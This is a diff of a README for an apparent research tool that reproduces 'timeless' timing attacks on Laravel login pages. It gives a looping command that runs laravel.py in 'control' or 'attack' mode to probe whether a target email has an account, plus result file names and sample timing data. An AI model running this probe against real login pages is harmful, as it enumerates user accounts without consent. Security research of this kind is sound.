@@ -34,18 +34,44 @@ Tom Van Goethem et al (Timeless timing attacks)
 
 
 ## Geoff's notes
-`while sleep 61; do python laravel.py {login URL} {registered email} {target email} {"control"|"attack"} >> {filename}; done`  
+`while sleep 61; do python laravel.py {login URL} {registered email} {target email} {"local"|"remote"|"distant"} {"control"|"attack"}; done`  
 I.e.  
-`while sleep 61; do python laravel.py https://laravel7app.com/login known-registered-account@gmail.com target@gmail.com control >> target_local.csv; done`  
-Switch final arg "control" to "attack" to probe the target user  
+`while sleep 61; do python laravel.py https://laravel7app.com/login known-registered-account@gmail.com target@gmail.com local control; done`  
+Switch final arg "control" to "attack" to probe the target user account
   
-Filenames
+Filenames are like this
 ```
-target_local.csv
-control_local.csv
-target_remote.csv
-control_remote.csv
+results/local_control_detail.csv
+results/local_control_winners.csv
+results/remote_control_detail.csv
+results/remote_control_winners.csv
+results/distant_control_detail.csv
+results/distant_control_winners.csv
+results/local_target_detail.csv
+results/local_target_winners.csv
+results/remote_target_detail.csv
+results/remote_target_winners.csv
+results/distant_target_detail.csv
+results/distant_target_winners.csv
+
 ```
 
-TODO  
-Parameterise (maybe as ENV vars, or preferably script args?) various things
+Detail files have contents like this:
+```
+66904389,302,302
+69115705,302,302
+54883308,302,302
+66942454,302,302
+64316212,302,302
+67685984,302,302
+68458219,302,302
+59474604,302,302
+74394309,302,302
+77712399,302,302
+```
+
+Winners files have contents like this:
+```
+2
+2
+```
